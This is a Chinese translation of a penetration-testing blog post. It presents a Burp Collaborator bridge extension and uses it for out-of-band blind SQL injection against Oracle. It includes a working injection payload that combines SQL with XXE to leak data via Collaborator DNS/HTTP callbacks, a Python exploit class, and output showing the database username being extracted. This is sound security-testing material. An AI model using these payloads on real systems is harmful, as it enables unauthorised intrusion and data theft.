# 【技术分享】超越检测：利用Burp Collaborator执行SQL盲注

阅读量 **237375**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-01-10 16:14:48

 **x**

##### 译文声明

本文是翻译文章，文章来源：blog.silentsignal.eu

原文地址：<https://blog.silentsignal.eu/2017/01/03/beyond-detection-exploiting-blind-sql-injections-with-burp-collaborator/#more-1054>

译文仅供参考，具体内容表达以及含义原文为准。

****

**翻译：**[ **shan66**
****](http://bobao.360.cn/member/contribute?uid=2522399780)

**预估稿费：180RMB（不服你也来投稿啊！）**

******投稿方式：发送邮件至**[ **linwei#360.cn**](mailto:linwei@360.cn) **，或登陆**[
**网页版**](http://bobao.360.cn/contribute/index) **在线投稿******

**前言**

一直一来，我们的大部分的渗透测试项目都是围绕着Web应用程序和/或涉及数据库后端的。对于围绕着Web应用程序的测试项目来说，通常使用Burp套件会更方便一些，同时，Burp套件还内置了相应的扫描器，所以可以用来识别数据库注入漏洞方面的安全问题。然而，检测漏洞只是完成了渗透测试工作的一半而已；一个优秀的渗透测试人员，还应该通过SQL注入之类的数据库安全漏洞来进一步扩大渗透测试的覆盖范围（当然，不能逾越渗透测试的指定范围）。尽管Burp的扫描引擎的性能在不断改进，但仍然无法直接利用这些漏洞，因此，除了进行手动测试外，大多渗透测试人员还需要借助使用第三方的独立工具。随着Burp
Suite
1.7.09版本的面世，它的新功能随之带来了新的契机：我们可以通过某种方式将Burp的独特功能与我们的数据库漏洞利用框架相结合，从而产生更加让人震撼的功能。

我们知道，许多服务器（甚至许多Web应用程序和自定义应用程序API）都会用到数据库后端，并且通常都是通过SQL完成相应的数据库操作的。因此，SQL注入就是这个游戏中不可或缺的一部分。虽然有一些专门的工具可以用来利用这类漏洞，但是我们发现，有时更简单的工具能够带来更高的效率。因此，[Duncan便应运而生](https://blog.silentsignal.eu/2014/01/10/duncan-expensive-injections/)了，在许多情况下，它能够让SQL注入测试变得更加容易——例如，在来自服务器的响应可以解释为两个不同值或必须使用某些侧信道（通常是计时）的情况下，这两种情况通常分别称为盲注和基于时间的SQL注入。当然，还存在其他之类的侧信道，只是还没有得到广泛使用而已。

  

**利用Burp Collaborator执行SQL盲注**

当[PortSwigger在2015年4月公布Burp
Collaborator](http://blog.portswigger.net/2015/04/introducing-burp-collaborator.html)后，游戏规则从此就变了，因为它可以检测到带外交互。因为它可以在其自己的域下运行多个服务器（DNS、HTTP、HTTPS及更高版本的SMTP、IMAP和POP3服务器），并能够在发送到服务器的payload中插入特殊的子域（例如rvqhg498gxa339ere9i1lby1dsji77.burpcollaborator.net），然后就可以监听上述服务器中涉及这些子域的所有请求了。这使得侧信道攻击要比时间攻击快得多（当不能引入延迟时，这是唯一的侧信道），因此几个月后，[该扫描仪引擎也开始使用它了](http://releases.portswigger.net/2015/09/1627.html)。在2016年5月，[我对第三方工具是否可以使用Collaborator的可能性进行了查询](https://support.portswigger.net/customer/en/portal/questions/16289830-collaborator-interface-for-extensions)，他们的回复说将对开发人员开放。到了10月，他们实现了自己的承诺，并且，后来还[添加了一个官方的Collaborator
API](http://releases.portswigger.net/2016/10/1709.html)。

然而，这个API只能用于Burp，同时，我们也没有将Duncan移植到Burp中的打算——尽管Burp支持使用Python和Ruby编写的插件，但是需要使用Jython和JRuby，这可能会带来一些意想不到的麻烦。所以我开始创建一个通用插件，来给Burp
Collaborator和所有外部程序搭建一座桥梁。由于Burp支持多种平台，也就意味着这个充当桥梁的通用插件只有能够从多种编程语言轻松调用时才有实际意义，所以我决定使用基于TCP的[MessagePack](https://msgpack.org/)——为安全起见，它仅绑定到本地主机的8452端口上。

在相应的[GitHub仓库](https://github.com/silentsignal/burp-collab-gw)中提供了：

基于纯Java编写的Burp Extender的源代码（只有2个简单的类）

基于Python语言的简单客户端源代码

在README文件中对该协议的完整文本描述

虽然编译这些代码是相当简单的，但是，你仍然可以从<https://github.com/silentsignal/burp-collab-gw/releases>下载已经编译好的JAR文件。现在，它还没有提供GUI，只是简单绑定到了一个硬编码的端口上面——不过，它采用的是MIT许可，所以，欢迎其他开发人员提供GUI之类的功能。

有了这个工具后，Oracle数据库的渗透测试就会轻松多了。根据Oracle页面的描述，要想对Oracle数据库进行基于时间的注入攻击非常困难，因为DBMS_LOCK.SLEEP无法嵌入到SELECT语句中，而其他的解决方案则需要使用UTL_INADDR、URL_HTTP和类似的功能。然而，正如Burp开发人员所说的那样，“它们所需的权限，我们都不具备”。然而，同一篇博文也介绍了[Oracle中的XXE漏洞](https://blog.netspi.com/advisory-xxe-injection-oracle-database-cve-2014-6577/)，如果与Collaborator结合使用的话，就能作为侧信道使用。

有了它们，就可以构建以下Duncan类：

    
    
    tpl = """'||(SELECT CASE WHEN ASCII(SUBSTR(({s._query}),{s._pos},1))<{guess} 
    THEN extractValue(XMLType('<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE poc [ <!ENTITY % s2 SYSTEM "http://{payload}/">%s2;]>'),'/l') 
    ELSE '' END FROM dual)||'"""
    class OracleDuncan(duncan.Duncan):
        def decide(self, guess):
            c = Client()
            payload = c.generate_payload(include_location=True)
            requests.post(url, data={'q': tpl.format(s=self, guess=guess,
                payload=payload)}, allow_redirects=False)
            return c.fetch_collaborator_interactions_for(payload)

在Duncan中利用该模板进行猜测，然后根据它的计算结果为true还是false来执行一个XML操作，当且仅当表达式为true时，它才发出信号给Collaborator。Client类来自[Python示例客户端](https://github.com/silentsignal/burp-collab-gw/blob/master/clients/client.py)，url中包含了目标Web应用程序，数据则通过URL编码的POST正文中的名为q的参数进行发送。

由于这个Duncan框架调用decide方法时仅测试返回值是否为“真”，因此我们可以直接返回Collaborator的交互列表，因为Python中的列表被认为值是“真”，只要这个列表不是空值——这样的话，意味着至少有一个Collaborator与用于注入的XML中的payload进行了交互。

这种方法不仅比传统的基于时间的攻击更快，而且还允许多线程操作，因为所有请求与payload的特殊标记是无关的。下面是使用Duncan和上面的类来提取数据库用户名的例子。

    
    
    $ time python run_duncan.py --query 'SELECT user FROM dual' 
        --charset ABCDEFGHIJKLMNOPQRSTUVWXYZ --pos-start 1 --pos-end 5 
        --use poc.OracleDuncan --threads 1
    VSZA
    5,33s user 0,03s system 27% cpu 19,518 total
    $ time python run_duncan.py --query 'SELECT user FROM dual' 
        --charset ABCDEFGHIJKLMNOPQRSTUVWXYZ --pos-start 1 --pos-end 5 
        --use poc.OracleDuncan --threads 2
    VSZA
    5,50s user 0,04s system 38% cpu 14,459 total
    $ time python run_duncan.py --query 'SELECT user FROM dual' 
        --charset ABCDEFGHIJKLMNOPQRSTUVWXYZ --pos-start 1 --pos-end 5 
        --use poc.OracleDuncan --threads 5
    VSZA
    5,54s user 0,07s system 50% cpu 11,165 total

正如上面所看到的，与单线程版本相比，2线程的时间性能提升了25%，而5线程的性能则提升了40%。在本次测试中，当线程数超过5以后，就不会有明显的加速效果，但是，这可能是由于被测试服务自身的原因导致的。

  

**总结**

我们希望，通过将我们的Burp
Extender插件公之于众，将使Collaborator可以与其他伟大的工具桥接起来，从而能够成功利用之前被认为只有通过传统的盲注才能利用的各种漏洞，进一步扩大的渗透测试的覆盖率。祝阅读愉快！

感谢József Marton为本文提供Oracle数据库测试帐户。

本文翻译自blog.silentsignal.eu
[原文链接](https://blog.silentsignal.eu/2017/01/03/beyond-detection-exploiting-blind-sql-injections-with-burp-collaborator/#more-1054)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **shan66** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/85297](/post/id/85297)

安全客 - 有思想的安全新媒体

本文转载自: [blog.silentsignal.eu](https://blog.silentsignal.eu/2017/01/03/beyond-detection-exploiting-blind-sql-injections-with-burp-collaborator/#more-1054)

如若转载,请注明出处： <https://blog.silentsignal.eu/2017/01/03/beyond-detection-exploiting-blind-sql-injections-with-burp-collaborator/#more-1054>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p1.ssl.qhmsg.com/dm/200_200_100/t0137bdcb0fbd458b88.jpg) shan66

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

